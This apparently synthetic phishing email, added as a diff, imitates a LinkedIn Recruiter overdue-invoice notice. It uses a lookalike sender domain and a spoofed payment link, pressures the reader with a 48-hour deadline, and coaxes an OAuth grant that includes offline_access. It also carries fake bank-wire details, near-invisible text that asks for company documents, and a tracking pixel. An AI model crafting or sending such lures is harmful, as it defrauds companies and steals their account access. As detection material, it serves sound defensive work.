@@ -1,0 +1,112 @@
+From: LinkedIn Talent Solutions <billing@Iinkedin-talent.example>
+To: hr-benefits@corp.internal
+Cc: finance@corp.internal
+Reply-To: talent.billing@linkedin-solutions-mail.example
+Date: Tue, 27 Oct 2026 08:00:00 +0800
+Message-ID: <0706-b61@synth.example>
+Subject: [Overdue Invoice] LinkedIn Recruiter Seats — $18,400 balance due (Account suspension in 48 hours)
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #0A66C2;border-radius:8px;overflow:hidden">
+<div style="background:#0A66C2;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">LinkedIn | Talent Solutions</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">Recruiter & Jobs — Billing Notification</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear Customer,</p>
+
+<p>Your LinkedIn Recruiter subscription has an <b style="color:#e00">overdue balance of $18,400.00</b>. If payment is not received within <b>48 hours</b>, your Recruiter seats will be suspended and all active job postings will be deactivated.</p>
+
+<h3>一、Account Summary</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Account Name</td><td>Your Company — Talent Acquisition</td></tr>
+<tr><td style="background:#f5f5f5">Billing Contact</td><td>hr-benefits@corp.internal</td></tr>
+<tr><td style="background:#f5f5f5">Contract Number</td><td><b>TS-2026-CN-8842</b></td></tr>
+<tr><td style="background:#f5f5f5">Product</td><td>LinkedIn Recruiter (Corporate) — 12 seats</td></tr>
+<tr><td style="background:#f5f5f5">Billing Period</td><td>July 1 - December 31, 2026</td></tr>
+<tr><td style="background:#f5f5f5">Seats Active</td><td>12 (8 recruiters + 4 hiring managers)</td></tr>
+<tr><td style="background:#f5f5f5">Monthly Fee</td><td>$9,200.00</td></tr>
+<tr><td style="background:#f5f5f5">Overdue Period</td><td>2 months (September + October)</td></tr>
+<tr><td style="background:#f5f5f5"><b>Total Due</b></td><td><b style="color:#e00">$18,400.00 USD</b></td></tr>
+<tr><td style="background:#f5f5f5">Suspension Date</td><td style="color:#e00"><b>October 29, 2026 at 08:00 UTC</b></td></tr>
+</table>
+
+<h3>二、What Happens at Suspension</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Feature</th><th>Active</th><th>Suspended</th></tr>
+<tr><td>LinkedIn Recruiter search</td><td>✓</td><td style="color:#e00">✗</td></tr>
+<tr><td>InMail credits (850 remaining)</td><td>✓</td><td style="color:#e00">Lost</td></tr>
+<tr><td>Job postings (14 active)</td><td>✓</td><td style="color:#e00">Deactivated</td></tr>
+<tr><td>Talent pipeline (1,247 candidates)</td><td>✓</td><td style="color:#e00">Archived</td></tr>
+<tr><td>Saved searches (38)</td><td>✓</td><td style="color:#e00">Lost</td></tr>
+<tr><td>Interview scheduling</td><td>✓</td><td style="color:#e00">✗</td></tr>
+<tr><td>Analytics & reporting</td><td>✓</td><td style="color:#e00">✗</td></tr>
+</table>
+<p style="font-size:13px;color:#666"><b>Impact:</b> Your 14 active job postings have received 842 applications. Suspension will remove all postings and archive the 1,247-candidate pipeline. Reactivation after payment takes 3-5 business days and saved searches cannot be recovered.</p>
+
+<h3>三、How to Pay</h3>
+
+<p><b>Option 1 (Recommended) — Instant payment via LinkedIn Identity:</b></p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://Iinkedin-talent.example/billing/pay?contract=TS-2026-CN-8842&amount=18400" style="display:inline-block;background:#0A66C2;color:#fff;padding:14px 40px;text-decoration:none;border-radius:20px;font-weight:bold;font-size:16px">Pay $18,400 Now</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://www.linkedin.com/talent-solutions/billing</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Sign in with LinkedIn or your corporate Google Workspace account）</p>
+
+<h3>About Corporate SSO Payment</h3>
+<p>When you click the payment button, you will see two sign-in options:</p>
+<ol>
+<li><b>LinkedIn Sign-in:</b> Use your LinkedIn username and password</li>
+<li><b>Corporate SSO (Google Workspace):</b> Use your company email (@corp.internal) through Google's OAuth</li>
+</ol>
+
+<p>If you choose Corporate SSO, you will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint) and asked to grant:</p>
+<ul>
+<li><code>openid</code> — basic identity</li>
+<li><code>profile</code> — display name</li>
+<li><code>email</code> — corporate email verification</li>
+<li><code>offline_access</code> — maintains payment session during multi-step checkout</li>
+</ul>
+
+<p style="font-size:14px;background:#E3F2FD;padding:12px;border-radius:4px">
+<b>Why we offer Google Workspace SSO:</b> LinkedIn Talent Solutions integrated corporate SSO in 2026-Q1 to simplify billing for enterprise customers. Many Fortune 500 companies require SSO for all procurement transactions (per their internal security policies). If your company requires SSO, this option eliminates the need for a separate LinkedIn password for billing purposes. The offline_access token is scoped only to the LinkedIn billing application and expires after the checkout session completes (typically 5-10 minutes for a $18,400 payment).
+</p>
+
+<p><b>Option 2 — Bank Wire:</b></p>
+<div style="background:#f9f9f9;padding:12px;border-radius:4px;border-left:4px solid #0A66C2">
+<p>Beneficiary: LinkedIn Ireland Operations Ltd<br>
+Bank: Wells Fargo Bank, N.A. (San Francisco)<br>
+Account: 8842-6619-4471<br>
+SWIFT: TSTBUS6S<br>
+Reference: TS-2026-CN-8842</p>
+</div>
+<p>Bank wire takes 2-3 business days — <b>you will miss the 48-hour window</b>.</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文账单协助或发票（增值税专用发票），请访问 Iinkedin-talent.example/cn-billing 上传公司开票信息与营业执照（中文通道，当日处理）。</p>
+
+<h3>四、Recent Activity on Your Account</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Date</th><th>Activity</th><th>User</th></tr>
+<tr><td>10/25</td><td>Posted job: Senior Rust Engineer (Hangzhou)</td><td>zhang.min</td></tr>
+<tr><td>10/24</td><td>Sent 15 InMails to candidates</td><td>chen.xi</td></tr>
+<tr><td>10/22</td><td>Updated pipeline: "Q4 Hiring Wave"</td><td>wang.fang</td></tr>
+<tr><td>10/18</td><td>Posted job: DevOps Engineer (Remote)</td><td>li.wei</td></tr>
+</table>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">LinkedIn Corporation | Talent Solutions Billing</p>
+<p style="font-size:11px;color:#999">1000 W Maude Ave, Sunnyvale, CA 94085</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the billing contact for contract TS-2026-CN-8842.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://Iinkedin-talent.example/api/track?recipient=hr-benefits%40corp.internal&contract=TS-2026-CN-8842&type=overdue_notice" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
